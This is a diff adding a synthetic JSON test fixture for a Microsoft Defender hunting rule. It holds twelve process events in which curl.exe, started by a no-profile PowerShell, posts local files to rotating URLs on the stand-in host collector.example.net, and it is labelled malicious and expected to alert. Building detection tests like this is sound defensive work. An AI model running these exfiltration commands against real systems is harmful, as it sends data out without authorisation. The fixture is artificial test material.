@@ -1,0 +1,144 @@
+{
+  "synthetic": true,
+  "source": "synthetic; https://cloud.google.com/blog/topics/threat-intelligence/artex-and-friends-enter-agentic-offensive-frameworks ; https://threatdefence.com/article/artex-agentic-attack-framework-detection-hunting ; https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table ; https://curl.se/docs/manpage.html ; https://www.gnu.org/software/wget/manual/wget.html",
+  "platform": "defender",
+  "table": "DeviceProcessEvents",
+  "label": "malicious",
+  "variant": "12 posts from one device to 12 distinct URLs on one host in an hour (GTIG rotating-URL pattern), parent is not a service",
+  "expect_alert": true,
+  "result": "not run (no KQL runner in this repo). Python mirror of the rule logic applied to these events: alert, matches expectation",
+  "events": [
+    {
+      "Timestamp": "2026-11-26T03:00:00Z",
+      "DeviceId": "synthetic-db01",
+      "DeviceName": "db01.corp.example",
+      "FileName": "curl.exe",
+      "ProcessCommandLine": "curl.exe -s -d @r0.txt https://collector.example.net/0000a000",
+      "AccountName": "svc_app",
+      "InitiatingProcessFileName": "powershell.exe",
+      "InitiatingProcessCommandLine": "powershell -nop -c ...",
+      "InitiatingProcessParentFileName": "explorer.exe"
+    },
+    {
+      "Timestamp": "2026-11-26T03:01:00Z",
+      "DeviceId": "synthetic-db01",
+      "DeviceName": "db01.corp.example",
+      "FileName": "curl.exe",
+      "ProcessCommandLine": "curl.exe -s -d @r1.txt https://collector.example.net/0001a007",
+      "AccountName": "svc_app",
+      "InitiatingProcessFileName": "powershell.exe",
+      "InitiatingProcessCommandLine": "powershell -nop -c ...",
+      "InitiatingProcessParentFileName": "explorer.exe"
+    },
+    {
+      "Timestamp": "2026-11-26T03:02:00Z",
+      "DeviceId": "synthetic-db01",
+      "DeviceName": "db01.corp.example",
+      "FileName": "curl.exe",
+      "ProcessCommandLine": "curl.exe -s -d @r2.txt https://collector.example.net/0002a014",
+      "AccountName": "svc_app",
+      "InitiatingProcessFileName": "powershell.exe",
+      "InitiatingProcessCommandLine": "powershell -nop -c ...",
+      "InitiatingProcessParentFileName": "explorer.exe"
+    },
+    {
+      "Timestamp": "2026-11-26T03:03:00Z",
+      "DeviceId": "synthetic-db01",
+      "DeviceName": "db01.corp.example",
+      "FileName": "curl.exe",
+      "ProcessCommandLine": "curl.exe -s -d @r3.txt https://collector.example.net/0003a021",
+      "AccountName": "svc_app",
+      "InitiatingProcessFileName": "powershell.exe",
+      "InitiatingProcessCommandLine": "powershell -nop -c ...",
+      "InitiatingProcessParentFileName": "explorer.exe"
+    },
+    {
+      "Timestamp": "2026-11-26T03:04:00Z",
+      "DeviceId": "synthetic-db01",
+      "DeviceName": "db01.corp.example",
+      "FileName": "curl.exe",
+      "ProcessCommandLine": "curl.exe -s -d @r4.txt https://collector.example.net/0004a028",
+      "AccountName": "svc_app",
+      "InitiatingProcessFileName": "powershell.exe",
+      "InitiatingProcessCommandLine": "powershell -nop -c ...",
+      "InitiatingProcessParentFileName": "explorer.exe"
+    },
+    {
+      "Timestamp": "2026-11-26T03:05:00Z",
+      "DeviceId": "synthetic-db01",
+      "DeviceName": "db01.corp.example",
+      "FileName": "curl.exe",
+      "ProcessCommandLine": "curl.exe -s -d @r5.txt https://collector.example.net/0005a035",
+      "AccountName": "svc_app",
+      "InitiatingProcessFileName": "powershell.exe",
+      "InitiatingProcessCommandLine": "powershell -nop -c ...",
+      "InitiatingProcessParentFileName": "explorer.exe"
+    },
+    {
+      "Timestamp": "2026-11-26T03:06:00Z",
+      "DeviceId": "synthetic-db01",
+      "DeviceName": "db01.corp.example",
+      "FileName": "curl.exe",
+      "ProcessCommandLine": "curl.exe -s -d @r6.txt https://collector.example.net/0006a042",
+      "AccountName": "svc_app",
+      "InitiatingProcessFileName": "powershell.exe",
+      "InitiatingProcessCommandLine": "powershell -nop -c ...",
+      "InitiatingProcessParentFileName": "explorer.exe"
+    },
+    {
+      "Timestamp": "2026-11-26T03:07:00Z",
+      "DeviceId": "synthetic-db01",
+      "DeviceName": "db01.corp.example",
+      "FileName": "curl.exe",
+      "ProcessCommandLine": "curl.exe -s -d @r7.txt https://collector.example.net/0007a049",
+      "AccountName": "svc_app",
+      "InitiatingProcessFileName": "powershell.exe",
+      "InitiatingProcessCommandLine": "powershell -nop -c ...",
+      "InitiatingProcessParentFileName": "explorer.exe"
+    },
+    {
+      "Timestamp": "2026-11-26T03:08:00Z",
+      "DeviceId": "synthetic-db01",
+      "DeviceName": "db01.corp.example",
+      "FileName": "curl.exe",
+      "ProcessCommandLine": "curl.exe -s -d @r8.txt https://collector.example.net/0008a056",
+      "AccountName": "svc_app",
+      "InitiatingProcessFileName": "powershell.exe",
+      "InitiatingProcessCommandLine": "powershell -nop -c ...",
+      "InitiatingProcessParentFileName": "explorer.exe"
+    },
+    {
+      "Timestamp": "2026-11-26T03:09:00Z",
+      "DeviceId": "synthetic-db01",
+      "DeviceName": "db01.corp.example",
+      "FileName": "curl.exe",
+      "ProcessCommandLine": "curl.exe -s -d @r9.txt https://collector.example.net/0009a063",
+      "AccountName": "svc_app",
+      "InitiatingProcessFileName": "powershell.exe",
+      "InitiatingProcessCommandLine": "powershell -nop -c ...",
+      "InitiatingProcessParentFileName": "explorer.exe"
+    },
+    {
+      "Timestamp": "2026-11-26T03:10:00Z",
+      "DeviceId": "synthetic-db01",
+      "DeviceName": "db01.corp.example",
+      "FileName": "curl.exe",
+      "ProcessCommandLine": "curl.exe -s -d @r10.txt https://collector.example.net/000aa070",
+      "AccountName": "svc_app",
+      "InitiatingProcessFileName": "powershell.exe",
+      "InitiatingProcessCommandLine": "powershell -nop -c ...",
+      "InitiatingProcessParentFileName": "explorer.exe"
+    },
+    {
+      "Timestamp": "2026-11-26T03:11:00Z",
+      "DeviceId": "synthetic-db01",
+      "DeviceName": "db01.corp.example",
+      "FileName": "curl.exe",
+      "ProcessCommandLine": "curl.exe -s -d @r11.txt https://collector.example.net/000ba077",
+      "AccountName": "svc_app",
+      "InitiatingProcessFileName": "powershell.exe",
+      "InitiatingProcessCommandLine": "powershell -nop -c ...",
+      "InitiatingProcessParentFileName": "explorer.exe"
+    }
+  ]
+}
